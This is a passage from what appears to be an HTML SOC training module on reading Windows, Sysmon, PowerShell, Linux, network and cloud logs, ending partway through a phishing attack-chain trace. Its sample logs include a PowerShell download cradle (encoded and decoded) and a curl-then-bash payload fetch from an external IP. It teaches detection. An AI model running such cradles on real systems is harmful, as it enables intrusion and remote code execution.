+Event ID:      <span class="f2">4688</span>
+Task Category: Process Creation
+Level:         Information
+
+<span class="dim">A new process has been created.</span>
+
+Creator Subject:
+    Account Name:       T.EZE
+    Account Domain:     SACSCORP
+
+New Process Name:  C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+Process Command Line: <span class="f2">powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATw...</span>
+Creator Process Name: C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE</div>
+        </div>
+
+        <p>Sit with that last example for a moment, because it is one of the most important single log lines in this entire week. Notice the <strong>Creator Process Name</strong>: <code>WINWORD.EXE</code>, meaning Microsoft Word itself launched PowerShell. Word does not normally launch PowerShell during legitimate business use. Notice also the command line: <code>-w hidden</code> (hide the window) and <code>-enc</code> (a Base64-encoded command, a common way attackers obscure exactly what they are running from a casual glance). Three fields in one event line just told you a story: a user opened a document, that document's macro spawned a hidden, obfuscated PowerShell process. That is the single most common opening move behind real-world phishing-led compromises, and you just read it directly off a raw log line.</p>
+
+        <div class="callout warning">
+          <div class="callout-title"><svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 9v4M12 17h.01M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z"/></svg> The gap nobody warns junior analysts about</div>
+          <p style="margin-bottom:0;">Event ID 4688 only includes that rich Process Command Line field if an administrator has explicitly turned on command-line process auditing via Group Policy. In a huge number of real environments, this setting is off, because it was never turned on, not because anyone decided against it deliberately. Without it, 4688 still fires, but you only see that <em>a</em> process was created, with none of the command-line detail that actually tells you what happened. This single missing setting is one of the most common, entirely preventable visibility gaps in real organisations, and it is exactly why this programme installs Sysmon on your Windows VM this week rather than relying on native logging alone.</p>
+        </div>
+      </section>
+
+      <section id="sysmon">
+        <div class="section-tag">Source 2</div>
+        <h2 class="section-title">Sysmon: seeing what Windows hides by default</h2>
+        <p class="section-dek">Sysmon (System Monitor) is a free Microsoft Sysinternals tool that most professional SOCs treat as close to mandatory. It does not replace Windows' native logs, it fills in almost everything they leave out.</p>
+
+        <table>
+          <tr><th>Event ID</th><th>What it captures</th></tr>
+          <tr><td class="tag">1</td><td>Process creation, including full command line, hashes, and parent process, by default, no Group Policy setting required</td></tr>
+          <tr><td class="tag">3</td><td>Network connection: source, destination, port, and the initiating process</td></tr>
+          <tr><td class="tag">7</td><td>Image or DLL loaded into a process</td></tr>
+          <tr><td class="tag">8</td><td>CreateRemoteThread, a common process injection technique indicator</td></tr>
+          <tr><td class="tag">10</td><td>ProcessAccess, one process opening a handle to another's memory (this is the LSASS access pattern from Week 1)</td></tr>
+          <tr><td class="tag">11</td><td>File creation, including the file's original name if renamed</td></tr>
+          <tr><td class="tag">12 / 13 / 14</td><td>Registry key or value created, modified, or renamed, key for spotting persistence</td></tr>
+          <tr><td class="tag">22</td><td>DNS query performed by a process, extremely useful for tying a suspicious domain back to the exact process that asked for it</td></tr>
+        </table>
+
+        <div class="term">
+          <div class="term-bar"><span class="term-dot" style="background:#E2604F"></span><span class="term-dot" style="background:#E3A63E"></span><span class="term-dot" style="background:#59C27C"></span><span class="term-label">Sysmon Event ID 1, the same PowerShell launch, seen through Sysmon instead</span></div>
+          <div class="term-body">Event ID: <span class="f2">1</span> (Process Create)
+UtcTime: 2026-08-21 10:02:14.311
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+CommandLine: powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATw...
+ParentImage: C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
+ParentCommandLine: "WINWORD.EXE" /n "C:\Users\T.Eze\Downloads\Invoice_2607.docm"
+Hashes: SHA256=1A79A4D60DE6718E8E5B326E338AE533...
+User: SACSCORP\T.EZE
+IntegrityLevel: Medium</div>
+        </div>
+
+        <p>Compare this to the 4688 example above. You get everything 4688 gave you, and critically, this is captured <strong>by default</strong> once Sysmon is installed, no Group Policy dependency. You also get the file hash (useful for later threat intelligence lookups from Week 13 onward) and the exact parent document filename, <code>Invoice_2607.docm</code>, which is itself a small but real clue: <code>.docm</code> is a macro-enabled Word document, and macro-enabled attachments are one of the most persistent phishing delivery mechanisms in use today, for the simple reason that they still work often enough to keep being used.</p>
+
+        <div class="callout story">
+          <div class="callout-title"><svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg> Why experienced SOC engineers treat Sysmon as close to non-negotiable</div>
+          <p style="margin-bottom:0;">Ask almost any working detection engineer what single piece of free software gives the best security return for the least cost, and Sysmon is one of the most common answers you will hear. It costs nothing, it is a small, well-understood Microsoft-authored tool, and it turns a Windows endpoint from a machine you can barely see into one that produces genuinely investigable evidence. This is precisely why it is installed on your lab Windows VM this very week, before you generate a single test behaviour: everything from Week 5's detection engineering onward assumes this level of visibility exists.</p>
+        </div>
+
+        <h4>Quick check: read the log, not the label <span class="live-tag">Click an answer</span></h4>
+        <p>Below is a real-looking Sysmon Event ID 3 (network connection). Read it fully before answering.</p>
+        <div class="term">
+          <div class="term-bar"><span class="term-dot" style="background:#E3A63E"></span><span class="term-label">Sysmon Event ID 3</span></div>
+          <div class="term-body">Event ID: <span class="f2">3</span> (Network Connect)
+UtcTime: 2026-08-21 10:02:19.887
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+User: SACSCORP\T.EZE
+DestinationIp: 91.243.44.18
+DestinationPort: 443
+Protocol: tcp</div>
+        </div>
+
+        <div class="quiz-item" data-answer="b">
+          <div class="quiz-q">Given everything you have seen so far in this walkthrough (the WINWORD to PowerShell launch, then this outbound connection from PowerShell itself), what is the most defensible next step?</div>
+          <div class="quiz-options">
+            <button class="quiz-opt" data-choice="a">Close it. PowerShell making HTTPS connections is completely normal.</button>
+            <button class="quiz-opt" data-choice="b">Escalate and investigate further. PowerShell spawned by an Office document, immediately followed by an outbound connection, is a textbook infection chain.</button>
+            <button class="quiz-opt" data-choice="c">Wait for a Sigma detection rule to fire before doing anything.</button>
+          </div>
+          <div class="quiz-feedback">
+            <p>Correct: <strong>escalate and investigate further.</strong> Individually, PowerShell running and an HTTPS connection happening are both mundane. Chained together with the parent process being Microsoft Word, in sequence, within five seconds, this is precisely the shape of a real infection: document opens, macro launches PowerShell, PowerShell reaches out to fetch or report to something external. This is also a preview of exactly what Week 5 formalises as a testable detection.</p>
+          </div>
+        </div>
+      </section>
+
+      <section id="powershell">
+        <div class="section-tag">Source 3</div>
+        <h2 class="section-title">PowerShell logging: watching the tool attackers love the most</h2>
+        <p class="section-dek">PowerShell is a legitimate, powerful Windows administration tool, and it is also, by a wide margin, one of the most abused tools in real-world intrusions, because it is already installed everywhere and can do almost anything.</p>
+
+        <p>Windows can log PowerShell activity at several levels of depth. The one that matters most for investigation is <strong>Script Block Logging</strong> (Event ID 4104), which records the actual code PowerShell executed, even if an attacker tried to obscure it with encoding or obfuscation, because Windows logs the code after it has been decoded and is about to run.</p>
+
+        <div class="tabs">
+          <div class="tab-buttons">
+            <button class="tab-btn active" data-tab="encoded">What the attacker sent</button>
+            <button class="tab-btn" data-tab="decoded">What 4104 actually captures</button>
+          </div>
+          <div class="tab-panel active" id="encoded">
+            <div class="term">
+              <div class="term-bar"><span class="term-dot" style="background:#E2604F"></span><span class="term-label">command line, as an attacker would send it</span></div>
+              <div class="term-body">powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AOQAxAC4AMgA0ADMALgA0ADQALgAxADgALwBzAHQAYQBnAGUAMgAuAHAAcwAxACcAKQA=</div>
+            </div>
+            <p>To a first glance, this tells you almost nothing. This is exactly why relying on the command line alone, without script block logging, is not enough: an attacker only needs a few seconds of obfuscation to defeat a human simply eyeballing the command.</p>
+          </div>
+          <div class="tab-panel" id="decoded">
+            <div class="term">
+              <div class="term-bar"><span class="term-dot" style="background:#59C27C"></span><span class="term-label">Event ID 4104, Script Block Logging, decoded automatically by Windows</span></div>
+              <div class="term-body">Event ID: <span class="f2">4104</span> (Script Block Logging)
+ScriptBlockText:
+IEX (New-Object Net.WebClient).DownloadString('http://91.243.44.18/stage2.ps1')
+
+Path: 
+ScriptBlockId: 3f9a2e10-88c1-4a11-9b7e-1122334455aa</div>
+            </div>
+            <p>Now the intent is completely readable: download a second script from an external server and execute it immediately in memory (<code>IEX</code> is short for Invoke-Expression). This single technique, often called a "download cradle," is one of the most common early-stage patterns in real intrusions, precisely because it lets an attacker keep the actual malicious payload off disk until the very last moment, which also happens to be why endpoint file-scanning alone is not sufficient defence.</p>
+          </div>
+        </div>
+
+        <div class="callout pitfall">
+          <div class="callout-title"><svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 8v4M12 16h.01"/></svg> Common pitfall: assuming obfuscation defeats logging</div>
+          <p style="margin-bottom:0;">New analysts sometimes assume that if a command is Base64-encoded or otherwise obfuscated, "the logs won't show what it really did." With script block logging enabled, this is usually false, PowerShell has to decode its own instructions before running them, and Windows captures that decoded form. The obfuscation defeats a human glancing at a command line. It does not defeat a properly configured log source. This is a genuinely reassuring fact once you know it, and a dangerous blind spot if you do not.</p>
+        </div>
+      </section>
+
+      <section id="linux">
+        <div class="section-tag">Source 4</div>
+        <h2 class="section-title">Linux telemetry: syslog, journald, and auditd</h2>
+        <p class="section-dek">Linux logging looks completely different from Windows, both in format and in philosophy, and you will need fluency in it for your Linux VM, for the servers many organisations run, and for the Zeek and Wazuh work later in this programme.</p>
+
+        <h4>syslog: the long-standing standard</h4>
+        <p>Traditional Linux systems write plain-text log lines to files under <code>/var/log</code>, following a loose but widely recognised format. The classic example every analyst should recognise on sight is an SSH authentication log line.</p>
+        <div class="term">
+          <div class="term-bar"><span class="term-dot" style="background:#E2604F"></span><span class="term-dot" style="background:#E3A63E"></span><span class="term-dot" style="background:#59C27C"></span><span class="term-label">/var/log/auth.log, a failed then successful SSH login</span></div>
+          <div class="term-body">Aug 21 02:14:01 web-srv-03 sshd[19822]: <span class="f3">Failed password for root from 185.220.101.44 port 51190 ssh2</span>
+Aug 21 02:14:03 web-srv-03 sshd[19822]: <span class="f3">Failed password for root from 185.220.101.44 port 51190 ssh2</span>
+Aug 21 02:14:07 web-srv-03 sshd[19844]: <span class="f4">Accepted password for root from 185.220.101.44 port 51204 ssh2</span>
+Aug 21 02:14:07 web-srv-03 sshd[19844]: pam_unix(sshd:session): session opened for user root by (uid=0)</div>
+        </div>
+        <p>Notice the pattern: repeated failures against the <code>root</code> account (a red flag on its own, since direct root SSH login is bad practice almost everywhere and is usually disabled), followed immediately by a success from the same source. This is the Linux equivalent of the brute-force-then-success pattern from Week 1's alert queue, just from a completely different operating system and log format.</p>
+
+        <h4>journald: the modern systemd-based approach</h4>
+        <p>Most current Linux distributions (Ubuntu, RHEL/CentOS, and others) use <code>systemd</code>, which stores logs in a structured binary format queried with the <code>journalctl</code> command, rather than plain text files.</p>
+        <div class="term">
+          <div class="term-bar"><span class="term-dot" style="background:#E2604F"></span><span class="term-dot" style="background:#E3A63E"></span><span class="term-dot" style="background:#59C27C"></span><span class="term-label">$ journalctl -u sshd --since "10 minutes ago"</span></div>
+          <div class="term-body">Aug 21 02:14:07 web-srv-03 sshd[19844]: Accepted password for root from 185.220.101.44 port 51204 ssh2
+Aug 21 02:14:08 web-srv-03 systemd-logind[712]: New session 44 of user root.
+Aug 21 02:15:51 web-srv-03 sudo[19901]:     root : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/curl -s http://91.243.44.18/payload.sh -o /tmp/.hidden.sh</div>
+        </div>
+        <p>The value of journald here is that it correlates cleanly across related system services, the SSH session, the login session manager, and the command actually executed by <code>sudo</code>, in one queryable timeline, without needing to cross-reference several separate plain-text files by hand.</p>
+
+        <h4>auditd: the deepest layer, at the kernel's own doorstep</h4>
+        <p>The Linux Audit daemon (<code>auditd</code>) can be configured to record system calls directly at the kernel level, the same category of depth that Sysmon provides on Windows. This is the tool you will configure on your Linux VM to get real process-execution visibility, not just what a shell chose to log about itself.</p>
+        <div class="term">
+          <div class="term-bar"><span class="term-dot" style="background:#E2604F"></span><span class="term-dot" style="background:#E3A63E"></span><span class="term-dot" style="background:#59C27C"></span><span class="term-label">$ ausearch -k exec_watch (a labelled auditd rule watching process execution)</span></div>
+          <div class="term-body">type=EXECVE msg=audit(1755741351.442:9981): argc=3 a0="/bin/bash" a1="/tmp/.hidden.sh" a2=""
+type=SYSCALL msg=audit(1755741351.442:9981): arch=c000003e syscall=59 success=yes exit=0
+ ppid=19901 pid=20011 auid=0 uid=0 gid=0 euid=0 comm="bash" exe="/bin/bash"
+ key="exec_watch"</div>
+        </div>
+        <p>This confirms, at the kernel level, that the file downloaded via <code>curl</code> in the journald example above was then executed with <code>bash</code>. Notice that <code>auid=0</code> (audit user ID, the original logged-in identity, which persists even through <code>sudo</code>) ties this action back to the same root session from the SSH login two log sources ago. This is exactly the kind of cross-source correlation a real investigation depends on, and exactly why this week deliberately shows you three different Linux log sources rather than just one.</p>
+      </section>
+
+      <section id="network">
+        <div class="section-tag">Source 5</div>
+        <h2 class="section-title">Network protocol telemetry: DNS, DHCP, HTTP, TLS, SSH, SMB, and RDP</h2>
+        <p class="section-dek">You will go far deeper into network analysis in Weeks 8 and 9 with Wireshark, Zeek, and Suricata. This week's job is narrower: recognise what each of these protocols' logs looks like, and what question each one can answer.</p>
+
+        <table>
+          <tr><th>Protocol</th><th>What its telemetry tells you</th><th>Typical use in an investigation</th></tr>
+          <tr><td>DNS</td><td>Which domain names a host resolved, and when</td><td>Finding command-and-control domains, spotting DNS tunnelling, confirming whether a host ever actually tried to reach a suspicious domain</td></tr>
+          <tr><td>DHCP</td><td>Which IP address was assigned to which device (by MAC address) at a given time</td><td>Turning "IP address 10.20.4.201 did X" into "laptop belonging to T.Eze did X," since IPs are frequently reassigned</td></tr>
+          <tr><td>HTTP</td><td>Web requests: method, URL path, user agent, response code</td><td>Confirming what was actually requested from or served by a web server, and spotting suspicious user agents or request patterns</td></tr>
+          <tr><td>TLS</td><td>Encrypted, but the handshake metadata (SNI, certificate details, JA3 fingerprinting) is still visible</td><td>Identifying the destination even when the content is encrypted, and sometimes fingerprinting the client software itself</td></tr>
+          <tr><td>SSH</td><td>Remote administrative access, source, destination, and authentication outcome</td><td>Tracing remote administrative access and lateral movement between Linux hosts</td></tr>
+          <tr><td>SMB</td><td>Windows file share access, including which files were read, written, or deleted</td><td>Tracing lateral movement, and detecting mass file access consistent with ransomware</td></tr>
+          <tr><td>RDP</td><td>Remote Desktop sessions: source, destination, session duration</td><td>Detecting one of the most common lateral movement and remote-access-abuse techniques in real intrusions</td></tr>
+        </table>
+
+        <div class="tabs">
+          <div class="tab-buttons">
+            <button class="tab-btn active" data-tab="dns-log">DNS query log</button>
+            <button class="tab-btn" data-tab="dhcp-log">DHCP lease log</button>
+            <button class="tab-btn" data-tab="http-log">HTTP access log</button>
+            <button class="tab-btn" data-tab="rdp-log">RDP logon event</button>
+          </div>
+          <div class="tab-panel active" id="dns-log">
+            <div class="term">
+              <div class="term-bar"><span class="term-dot" style="background:#3FC1B0"></span><span class="term-label">DNS server query log</span></div>
+              <div class="term-body">2026-08-21 10:02:20 client 10.20.4.15#51022: query: analytics-cdn-edge7.net IN A + (10.20.0.5)
+2026-08-21 10:02:20 client 10.20.4.15#51022: query: analytics-cdn-edge7.net IN A response: 91.243.44.18</div>
+            </div>
+            <p>This is the exact domain from Week 1's DNS beaconing alert. Notice this log alone confirms the resolution happened, and to which IP, but it does not tell you which process on the host asked for it, that detail lives in Sysmon Event ID 22 instead, which is exactly why cross-referencing sources matters.</p>
+          </div>
+          <div class="tab-panel" id="dhcp-log">
+            <div class="term">
+              <div class="term-bar"><span class="term-dot" style="background:#3FC1B0"></span><span class="term-label">DHCP server lease log</span></div>
+              <div class="term-body">2026-08-21 06:58:03 DHCPREQUEST for 10.20.4.15 from 3c:22:fb:8a:11:9e (T-EZE-LAPTOP) via eth0
+2026-08-21 06:58:03 DHCPACK on 10.20.4.15 to 3c:22:fb:8a:11:9e (T-EZE-LAPTOP) via eth0</div>
+            </div>
+            <p>This is what lets an investigator say, with confidence, that 10.20.4.15 was T.Eze's laptop at 06:58 that morning, not just "some device." Without DHCP logs retained for the relevant window, an IP-to-user mapping can become impossible to prove after the fact, particularly on networks where leases rotate frequently.</p>
+          </div>
+          <div class="tab-panel" id="http-log">
+            <div class="term">
+              <div class="term-bar"><span class="term-dot" style="background:#3FC1B0"></span><span class="term-label">Nginx access log, combined format</span></div>
+              <div class="term-body">91.243.44.18 - - [21/Aug/2026:10:02:21 +0100] "GET /stage2.ps1 HTTP/1.1" 200 4821 "-" "Mozilla/4.0 (compatible; MSIE 6.0)"</div>
+            </div>
+            <p>If this were a server you controlled being queried, the deliberately old, unusual user agent string is itself worth noticing, real modern browsers do not send this string; PowerShell's default web client historically did, and attackers sometimes forget or do not bother to change it.</p>
+          </div>
+          <div class="tab-panel" id="rdp-log">
+            <div class="term">
+              <div class="term-bar"><span class="term-dot" style="background:#3FC1B0"></span><span class="term-label">Windows Event ID 1149, Remote Desktop Services authentication succeeded</span></div>
+              <div class="term-body">Event ID: <span class="f2">1149</span>
+Source Network Address: 10.20.4.201
+Account: SVC-BACKUP
+Domain: SACSCORP</div>
+            </div>
+            <p>This is the same service account and source IP from Week 1's brute-force alert. An RDP logon from a service account is itself unusual; service accounts typically run scheduled processes, not interactive remote desktop sessions.</p>
+          </div>
+        </div>
+      </section>
+
+      <section id="identity">
+        <div class="section-tag">Source 6</div>
+        <h2 class="section-title">Authentication and identity logs: the Logon Type field you must never skip</h2>
+        <p class="section-dek">Every Windows logon event carries a Logon Type number that tells you exactly how the authentication happened. This single field is one of the highest-value details in the entire Windows logging model, and it is frequently ignored by junior analysts.</p>
+
+        <table>
+          <tr><th>Logon Type</th><th>Meaning</th><th>Investigative note</th></tr>
+          <tr><td class="tag">2</td><td>Interactive (local keyboard/screen logon)</td><td>Someone physically at the machine, or a very close local equivalent</td></tr>
+          <tr><td class="tag">3</td><td>Network</td><td>Very common and usually benign, for example accessing a file share, but also used by many lateral movement techniques</td></tr>
+          <tr><td class="tag">4</td><td>Batch</td><td>Scheduled task execution</td></tr>
+          <tr><td class="tag">5</td><td>Service</td><td>A Windows service starting under an account's credentials</td></tr>
+          <tr><td class="tag">7</td><td>Unlock</td><td>Workstation was unlocked, not a fresh logon</td></tr>
+          <tr><td class="tag">8</td><td>NetworkCleartext</td><td>Credentials sent in a recoverable form over the network, worth extra scrutiny</td></tr>
+          <tr><td class="tag">10</td><td>RemoteInteractive</td><td>This is RDP. Directly relevant to lateral movement hunting</td></tr>
+          <tr><td class="tag">11</td><td>CachedInteractive</td><td>Logon using cached domain credentials, for example a laptop logging in without reaching a domain controller</td></tr>
+        </table>
+
+        <div class="callout mentor">
+          <div class="callout-title"><svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2l2.4 7.2H22l-6 4.6 2.3 7.2-6.3-4.6-6.3 4.6 2.3-7.2-6-4.6h7.6z"/></svg> Why this field alone can make or break an investigation</div>
+          <p style="margin-bottom:0;">Go back to Week 1's after-hours database export alert, SOC-11205. The account logged in successfully with no corresponding badge entry. If you pulled the actual 4624 event and it showed Logon Type 10 (RemoteInteractive, meaning RDP) from an unfamiliar internal IP, that single field would immediately support the compromised-credentials theory far more strongly than a vague "she logged in somehow." This is exactly the kind of specific, field-level evidence that turns "I think this is suspicious" into "here is precisely how this happened," which is the difference between a triage guess and a real investigative finding.</p>
+        </div>
+      </section>
+
+      <section id="perimeter">
+        <div class="section-tag">Source 7</div>
+        <h2 class="section-title">Firewall, proxy, VPN, and cloud audit telemetry</h2>
+        <p class="section-dek">These are the sources that show activity crossing a boundary, between your network and the internet, between a user and a cloud platform, or between an untrusted device and your corporate resources.</p>
+
+        <div class="tabs">
+          <div class="tab-buttons">
+            <button class="tab-btn active" data-tab="fw-log">Firewall log</button>
+            <button class="tab-btn" data-tab="vpn-log">VPN concentrator log</button>
+            <button class="tab-btn" data-tab="cloudtrail-log">AWS CloudTrail</button>
+            <button class="tab-btn" data-tab="azuread-log">Azure AD sign-in log</button>
+          </div>
+          <div class="tab-panel active" id="fw-log">
+            <div class="term">
+              <div class="term-bar"><span class="term-dot" style="background:#E2604F"></span><span class="term-label">perimeter firewall, outbound connection permitted</span></div>
+              <div class="term-body">2026-08-21 10:02:19 ALLOW TCP src=10.20.4.15:51330 dst=91.243.44.18:443 rule="Allow-HTTPS-Outbound" bytes_sent=214 bytes_recv=4821</div>
+            </div>
+            <p>Firewalls typically log the decision (allow or deny), not the content. This is why network metadata tools like Zeek, covered in Week 9, exist as a complementary layer: the firewall confirms the connection was permitted, Zeek and packet capture reveal what actually passed through it.</p>
+          </div>
+          <div class="tab-panel" id="vpn-log">
+            <div class="term">
+              <div class="term-bar"><span class="term-dot" style="background:#E2604F"></span><span class="term-label">VPN concentrator session log</span></div>
+              <div class="term-body">2026-08-14 09:26:41 VPN-01: Tunnel established. User=CHIDI.OKAFOR ClientIP=41.203.88.12 AssignedIP=185.220.101.7 AuthMethod=MFA+Certificate</div>
+            </div>
+            <p>This is the exact log entry that resolved Week 1's "impossible travel" alert as a benign true positive. Notice it records both the real client IP (Nigeria-based) and the VPN-assigned internal IP (the Amsterdam-based address the SIEM saw), plus confirmation that MFA was used, all details that mattered directly to that earlier triage decision.</p>
+          </div>
+          <div class="tab-panel" id="cloudtrail-log">
+            <div class="term">
+              <div class="term-bar"><span class="term-dot" style="background:#E2604F"></span><span class="term-label">AWS CloudTrail event, abbreviated JSON</span></div>
+              <div class="term-body">{
+  "eventTime": "2026-08-21T10:05:02Z",
+  "eventName": "PutBucketPolicy",
+  "userIdentity": { "arn": "arn:aws:iam::4021:user/t.eze" },
+  "sourceIPAddress": "91.243.44.18",
+  "requestParameters": {
+    "bucketName": "sacscorp-client-invoices",
+    "policy": "{ \"Effect\": \"Allow\", \"Principal\": \"*\" ... }"
+  }
+}</div>
+            </div>
+            <p>This entry shows a bucket policy change making a storage bucket publicly readable, requested from the same suspicious IP seen earlier in this week's walkthrough. Cloud audit logs like CloudTrail record the "who did what to which resource" story that on-premises firewall logs simply cannot, because the action happened entirely inside a cloud provider's control plane, never crossing your own network perimeter at all.</p>
+          </div>
+          <div class="tab-panel" id="azuread-log">
+            <div class="term">
+              <div class="term-bar"><span class="term-dot" style="background:#E2604F"></span><span class="term-label">Azure AD (Entra ID) sign-in log, abbreviated</span></div>
+              <div class="term-body">Sign-in time:     2026-08-21T10:01:03Z
+User:             t.eze@sacscorp.com
+Application:      Office 365 Exchange Online
+IP address:       102.89.44.201
+Location:         Lagos, NG
+Conditional Access: Success
+Risk level:       Medium (unfamiliar sign-in properties)</div>
+            </div>
+            <p>Modern identity platforms increasingly compute their own risk score per sign-in, using signals like device familiarity and travel patterns. This is useful, but should never fully replace your own reasoning; a "Medium" risk score is an input to your judgement, from Week 1's Core Concept 3, not a replacement for it.</p>
+          </div>
+        </div>
+      </section>
+
+      <section id="quality">
+        <div class="section-tag">The Part Everyone Underestimates</div>
+        <h2 class="section-title">Timestamps, fields, and data quality: the boring details that break real investigations</h2>
+        <p class="section-dek">This section covers the least glamorous material in the whole week, and arguably causes more real investigative failures than any single technique you will learn later in this programme.</p>
+
+        <h4>Timezones and clock drift</h4>
+        <p>Every log source above showed timestamps. In a real multi-system investigation, those timestamps rarely arrive in the same timezone, or even the same format, by default. A Windows Event Log might show local time. A Linux syslog line might show UTC. A cloud audit log almost always shows UTC. If you build a timeline without normalising all of these to one common reference, you can produce an impossible sequence of events, or worse, a plausible but wrong one that nobody notices until much later.</p>
+
+        <div class="callout warning">
+          <div class="callout-title"><svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 9v4M12 17h.01M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z"/></svg> A realistic failure this causes</div>
+          <p style="margin-bottom:0;">Imagine a Lagos-based SOC (UTC+1) investigating a case involving a US-based cloud server logging in UTC, and a European VPN concentrator logging in its own local time (UTC+2 in summer). If an analyst treats all three timestamp columns as directly comparable without converting them, events that actually happened in a clean, logical order can appear scrambled, sometimes even appearing to happen "before" the action that caused them. This is not a hypothetical concern raised for effect; timezone-handling mistakes are a genuinely common, well-documented source of investigative errors, precisely because the fix (always normalise to UTC before building a timeline) is simple, but easy to forget under pressure.</p>
+        </div>
+
+        <h4>Field naming: the same fact, a dozen different names</h4>
+        <p>Different vendors name the same concept differently. A source IP address might appear as <code>src_ip</code>, <code>source.ip</code>, <code>srcaddr</code>, <code>SourceAddress</code>, or <code>clientip</code>, depending entirely on which product produced the log. This is precisely the problem that log normalisation and common schemas (such as the Elastic Common Schema, which you will meet properly when Wazuh is introduced in Week 4) exist to solve: mapping every vendor's own field names onto one consistent internal naming convention, so that a single search actually covers every relevant source instead of silently missing half of them because the field name did not match.</p>
+
+        <table>
+          <tr><th>Concept</th><th>Windows field</th><th>Linux/syslog field</th><th>Cloud/JSON field</th><th>Normalised (ECS-style)</th></tr>
+          <tr class="schema-row"><td>Source IP</td><td>IpAddress</td><td>(embedded in message text)</td><td>sourceIPAddress</td><td>source.ip</td></tr>
+          <tr class="schema-row"><td>Account name</td><td>TargetUserName</td><td>(embedded in message text)</td><td>userIdentity.arn</td><td>user.name</td></tr>
+          <tr class="schema-row"><td>Event time</td><td>TimeCreated</td><td>syslog timestamp prefix</td><td>eventTime</td><td>@timestamp</td></tr>
+          <tr class="schema-row"><td>Process name</td><td>NewProcessName / Image</td><td>comm / exe</td><td>(rare, application-specific)</td><td>process.name</td></tr>
+        </table>
+
+        <h4>Retention: evidence has an expiry date, and someone chose it</h4>
+        <p>Log retention is always a deliberate, cost-driven decision, hot storage (instantly searchable) is expensive, cold storage (archived, slower to retrieve) is cheaper, and many organisations delete logs entirely past a certain point to control cost. Regulatory standards frequently set minimums, for example PCI DSS has historically required at least one year of log retention with a minimum of three months immediately available for analysis. Knowing your own organisation's retention windows before an incident happens, not during one, is a basic professional habit worth building now.</p>
+      </section>
+
+      <section id="trace">
+        <div class="section-tag">Applied Practice</div>
+        <h2 class="section-title">Hands-on: tracing one attack chain across every source you just learned</h2>
+        <p class="section-dek">This is where every source above comes together. Below is a single, realistic phishing-to-compromise chain. Click each step to reveal exactly which telemetry source would prove it happened, and what that evidence would look like.</p>
+
+        <div class="trace-step">
+          <div class="trace-step-head">
+            <div class="trace-num">1</div>
+            <div class="trace-step-title">T.Eze receives and opens a phishing email with a macro-enabled attachment</div>
+            <button class="trace-toggle-btn" onclick="toggleTrace('t1')">Reveal telemetry</button>
+          </div>
+          <div class="trace-body" id="t1">
+            <p><strong>Source:</strong> Email gateway / mail server logs (not covered in depth this week, formally addressed in Week 15 onward as part of threat intelligence and phishing scenarios), plus Windows Sysmon Event ID 1 showing WINWORD.EXE launching.</p>
+            <p style="margin-bottom:0;">This is the earliest point at which any telemetry exists at all. If email gateway logging is not retained, this step may be permanently unrecoverable in a later investigation, reinforcing this week's opening point about visibility only existing from the moment logging began.</p>
+          </div>
+        </div>
+
+        <div class="trace-step">
+          <div class="trace-step-head">
+            <div class="trace-num">2</div>
+            <div class="trace-step-title">The macro spawns a hidden, obfuscated PowerShell process</div>
+            <button class="trace-toggle-btn" onclick="toggleTrace('t2')">Reveal telemetry</button>
+          </div>
+          <div class="trace-body" id="t2">
+            <p><strong>Source:</strong> Sysmon Event ID 1 (Process Create), with WINWORD.EXE as ParentImage. Also Windows Event ID 4688, but only if command-line auditing is enabled, this is the exact gap flagged earlier in this week's Windows Security Log section.</p>
+            <p style="margin-bottom:0;">This is the step examined in detail in the Sysmon section above.</p>
+          </div>
+        </div>
+
+        <div class="trace-step">
+          <div class="trace-step-head">
+            <div class="trace-num">3</div>
+            <div class="trace-step-title">PowerShell downloads and executes a second-stage script from an external server</div>
+            <button class="trace-toggle-btn" onclick="toggleTrace('t3')">Reveal telemetry</button>
+          </div>
+          <div class="trace-body" id="t3">
+            <p><strong>Source:</strong> Windows Event ID 4104 (PowerShell Script Block Logging, showing the decoded download command), Sysmon Event ID 3 (Network Connect, showing the outbound HTTPS connection), and DNS query logs if a domain name rather than a raw IP was used.</p>
+            <p style="margin-bottom:0;">This is the exact download cradle pattern shown in the PowerShell logging section above. Three independent sources corroborate the same single action, which is exactly the kind of multi-source confirmation a defensible investigation relies on.</p>
+          </div>
+        </div>
+
+        <div class="trace-step">
+          <div class="trace-step-head">
+            <div class="trace-num">4</div>
+            <div class="trace-step-title">The downloaded script creates a scheduled task for persistence</div>
+            <button class="trace-toggle-btn" onclick="toggleTrace('t4')">Reveal telemetry</button>
+          </div>
+          <div class="trace-body" id="t4">
+            <p><strong>Source:</strong> Windows Event ID 4698 (A scheduled task was created), and Sysmon Event ID 1 showing schtasks.exe or a direct registry write captured by Sysmon Event IDs 12/13 if the task is created by manipulating the registry directly rather than through the standard API.</p>
+            <p style="margin-bottom:0;">Persistence mechanisms are exactly what you will hunt for explicitly from Week 5 (detection engineering) and Week 10 (threat hunting) onward. Recognising this pattern now, at the raw telemetry level, is what makes those later weeks click quickly instead of feeling abstract.</p>
+          </div>
+        </div>
+
+        <div class="trace-step">
